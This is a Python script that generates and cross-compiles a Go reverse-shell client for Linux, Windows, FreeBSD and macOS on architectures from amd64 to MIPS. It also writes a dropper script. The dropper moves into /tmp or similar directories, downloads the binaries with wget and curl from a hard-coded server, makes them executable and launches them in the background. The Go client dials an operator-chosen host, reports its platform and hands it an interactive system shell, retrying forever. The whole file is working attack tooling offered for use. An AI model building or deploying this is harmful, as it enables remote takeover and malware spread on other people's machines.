import os
GOOS = ["linux","windows","freebsd","darwin"]
GOARCH = ["amd64","arm","386","mips","mipsle","mips64","mips64le"]

def compileCode(fileNme,shName):

    os.system("rm -rf ./bins/*")
    os.system("rm -rf ./{}".format(shName))
    shScript = "rm %s;cd /tmp || cd /var/run || cd /mnt || cd /root || cd / ;wget http://192.168.1.171:8000/bins/%s;curl -O http://192.168.1.171:8000/bins/%s;chmod +x *;./%s&\n"
    shFIle = open(shName+".sh",'w')
    for o in GOOS:
        for a in GOARCH:
            binFileNme = "{}.{}.{}".format(fileNme,o,a)
            output = os.popen('GOOS={} GOARCH={} GOMIPS=softfloat go build -ldflags "-s -w" -o ./bins/{} code.go'.format(o,a,binFileNme)).close()
            if output is None:
                shFIle.write(shScript % (shName,binFileNme,binFileNme,binFileNme))
    shFIle.close()


def createCodeFile(ip,port):
    goCode = '''package main

import (
	"net"
	"os/exec"
	"runtime"
	"time"
)

func main() {

	conn, err := net.Dial("tcp", "%s:%s")
	var cmd *exec.Cmd
	if err != nil {
		time.Sleep(5 * time.Second)
		main()
	}
	conn.Write([]byte(runtime.GOOS + "/" + runtime.GOARCH + "\\n"))
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	case "linux":
		cmd = exec.Command("/bin/sh")
	case "freebsd":
		cmd = exec.Command("/bin/csh")
	default:
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
	main()
}'''
    f = open("code.go","w")
    f.write(goCode % (ip,port))
    f.close

if __name__ == "__main__":
    serverIp = input("server ip：")
    serverPort = input("server port：")
    fileNme=input("bins name：")
    shName = input("script name：")
    createCodeFile(serverIp,serverPort)
    compileCode(fileNme,shName)
    os.system("rm code.go")